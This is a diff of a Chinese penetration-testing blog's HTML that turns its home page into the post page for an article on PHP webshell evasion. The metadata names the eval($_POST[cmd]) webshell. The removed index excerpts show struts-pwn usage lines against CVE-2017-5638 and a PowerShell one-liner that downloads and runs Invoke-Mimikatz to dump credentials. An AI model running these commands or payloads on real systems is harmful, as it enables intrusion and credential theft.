@@ -14,20 +14,18 @@
 <meta name="author" content="0o0" />
 
 
-    
-    
 
-
-<meta name="description" content="网络安全,白帽子,网络安全,渗透测试,博客">
-<meta property="og:type" content="website">
+<meta name="description" content="简介WebShell的变形技术与各种防护软件的检测方法一直都在相互对抗，本篇文章就对目前常见的WebShell的变形技术进行总结。 目前的防护软件对能够执行命令函数和能够执行代码的函数都会格外的敏感，如eavl、assert、system、popen、shell_exec，所以像最为简单的eval($_POST[cmd])的一句话就一定会被查杀。所以目前的变形的本质都在于如何隐藏自己的敏感函数。">
+<meta property="og:type" content="article">
 <meta property="og:title" content="0o0o0丶Blog">
-<meta property="og:url" content="https://10o0.github.io/index.html">
+<meta property="og:url" content="https://10o0.github.io/2017/12/08/PHP WebShell变形技术总结/index.html">
 <meta property="og:site_name" content="0o0o0丶Blog">
-<meta property="og:description" content="网络安全,白帽子,网络安全,渗透测试,博客">
+<meta property="og:description" content="简介WebShell的变形技术与各种防护软件的检测方法一直都在相互对抗，本篇文章就对目前常见的WebShell的变形技术进行总结。 目前的防护软件对能够执行命令函数和能够执行代码的函数都会格外的敏感，如eavl、assert、system、popen、shell_exec，所以像最为简单的eval($_POST[cmd])的一句话就一定会被查杀。所以目前的变形的本质都在于如何隐藏自己的敏感函数。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-12-08T07:35:20.902Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0o0o0丶Blog">
-<meta name="twitter:description" content="网络安全,白帽子,网络安全,渗透测试,博客">
+<meta name="twitter:description" content="简介WebShell的变形技术与各种防护软件的检测方法一直都在相互对抗，本篇文章就对目前常见的WebShell的变形技术进行总结。 目前的防护软件对能够执行命令函数和能够执行代码的函数都会格外的敏感，如eavl、assert、system、popen、shell_exec，所以像最为简单的eval($_POST[cmd])的一句话就一定会被查杀。所以目前的变形的本质都在于如何隐藏自己的敏感函数。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -53,8 +51,6 @@
 <link rel="stylesheet" href="/css/style.css">
 
 
-    <style> .article { opacity: 0;} </style>
-
 
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
@@ -68,8 +64,8 @@
     var yiliaConfig = {
         fancybox: true,
         animate: true,
-        isHome: true,
-        isPost: false,
+        isHome: false,
+        isPost: true,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -272,9 +268,7 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-PHP WebShell变形技术总结" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-PHP WebShell变形技术总结" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2017/12/08/PHP WebShell变形技术总结/" class="article-date">
@@ -695,511 +689,94 @@ $C=$T(&apos;&apos;,$t);$C();
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
   </div>
   
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-s2-045-exp-CVE-2017-5638" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/16/s2-045-exp-CVE-2017-5638/" class="article-date">
-      <time datetime="2017-03-16T03:30:23.000Z" itemprop="datePublished">2017-03-16</time>
-</a>
-
-
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/12/08/PHP WebShell变形技术总结/"></a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0o0</a></p>
+        <p><span>发布时间:</span>2017-12-08, 15:35:20</p>
+        <p><span>最后更新:</span>2017-12-08, 15:35:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/08/PHP WebShell变形技术总结/" title="">https://10o0.github.io/2017/12/08/PHP WebShell变形技术总结/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://10o0.github.io/2017/12/08/PHP WebShell变形技术总结/　　作者: 0o0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+
+
+
+    <nav id="article-nav">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/16/s2-045-exp-CVE-2017-5638/">s2-045 exp CVE-2017-5638</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>Usage:</p>
-<p>Testing a single URL.</p>
-<pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;
-</code></pre><p>Testing a list of URLs.</p>
-<pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;
-</code></pre><p>Checking if the vulnerability exists against a single URL.</p>
-<pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;
-</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p>
-<pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;
-</code></pre><p>Requirements</p>
-<pre><code>Python2 or Python3
-requests
-</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/exploit/">exploit</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exp/">exp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/s2-045/">s2-045</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Python-command" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/06/Python-command/" class="article-date">
-      <time datetime="2017-03-06T08:02:34.000Z" itemprop="datePublished">2017-03-06</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/06/Python-command/">Python command</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>python:</p>
-<pre><code>py -2 hello.py
-
-py -3 hello.py
-</code></pre><p>pip</p>
-<pre><code>py -2 -m pip install XXXX
-
-py -3 -m pip install XXXX
-</code></pre>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/笔记/">笔记</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SimpleHTTPServer" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/05/SimpleHTTPServer/" class="article-date">
-      <time datetime="2017-03-05T02:18:03.000Z" itemprop="datePublished">2017-03-05</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/03/16/s2-045-exp-CVE-2017-5638/">
+                    s2-045 exp CVE-2017-5638
+                </a>
+            </div>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/05/SimpleHTTPServer/">SimpleHTTPServer</a>
-    </h1>
-  
+    </nav>
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <pre><code>python -m SimpleHTTPServer 8080 #端口可自定义
-</code></pre>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/笔记/">笔记</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/command/">command</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
   
 </article>
 
-
-
-
-
-
-
-
-
-  
-    <article id="post-win10-Cmd-here" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/04/win10-Cmd-here/" class="article-date">
-      <time datetime="2017-03-04T08:27:02.000Z" itemprop="datePublished">2017-03-04</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/04/win10-Cmd-here/">win10-Cmd here</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>保存为reg格式导入注册表即可：</p>
-<pre><code>Windows Registry Editor Version 5.00
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]
-@=&quot;Cmd Here&quot;
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]
-@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;
-</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cmd/">cmd</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-hexo-command" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/02/hexo-command/" class="article-date">
-      <time datetime="2017-03-02T08:46:11.000Z" itemprop="datePublished">2017-03-02</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text"><a href="#&#x7B80;&#x4ECB;" class="headerlink" title="&#x7B80;&#x4ECB;"></a>&#x7B80;&#x4ECB;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#巧用-GPC"><span class="toc-number">2.</span> <span class="toc-text"><a href="#&#x5DE7;&#x7528;-GPC" class="headerlink" title="&#x5DE7;&#x7528;$GPC"></a>&#x5DE7;&#x7528;$GPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-GLOBALS"><span class="toc-number">2.1.</span> <span class="toc-text"><a href="#&#x5229;&#x7528;-GLOBALS" class="headerlink" title="&#x5229;&#x7528;$GLOBALS"></a>&#x5229;&#x7528;$GLOBALS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</span></a></li></ol>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/02/hexo-command/">hexo command</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <pre><code>hexo new &quot;postName&quot; #新建文章
-hexo new page &quot;pageName&quot; #新建页面
-hexo generate #生成静态页面至public目录
-hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
-hexo deploy #将.deploy目录部署到GitHub
-</code></pre><hr>
-<pre><code>hexo clean
-hexo generate --deploy
-</code></pre>
-      
     </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
     
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/笔记/">笔记</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
 
 
 
 
-
-
-
-
-
-  
-    <article id="post-mimikittenz-Ps1版" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/01/mimikittenz-Ps1版/" class="article-date">
-      <time datetime="2017-03-01T10:25:20.000Z" itemprop="datePublished">2017-03-01</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="scroll" id="post-nav-button">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/01/mimikittenz-Ps1版/">mimikittenz-Ps1版</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>‘); Invoke-Mimikatz -DumpCreds”</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/提权/">提权</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mimikittenz/">mimikittenz</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-0o0-test" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/03/01/0o0-test/" class="article-date">
-      <time datetime="2017-03-01T06:25:31.000Z" itemprop="datePublished">2017-03-01</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/01/0o0-test/">0o0-test</a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>测试文章–test—0o0~！！！！！！</p>
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
-      
+        
+            <a href="/2017/03/16/s2-045-exp-CVE-2017-5638/" title="下一篇: s2-045 exp CVE-2017-5638">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
 
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/PHP WebShell变形技术总结/">PHP WebShell变形技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/16/s2-045-exp-CVE-2017-5638/">s2-045 exp CVE-2017-5638</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/Python-command/">Python command</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/SimpleHTTPServer/">SimpleHTTPServer</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/win10-Cmd-here/">win10-Cmd here</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/02/hexo-command/">hexo command</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/01/mimikittenz-Ps1版/">mimikittenz-Ps1版</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/01/0o0-test/">0o0-test</a></li></ul>
 
 
 
 
-
-
-
-
-
-  
-  
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
@@ -1253,10 +830,6 @@ hexo generate --deploy
         })
     </script>
 
-
-    
-
-     
 
 
 
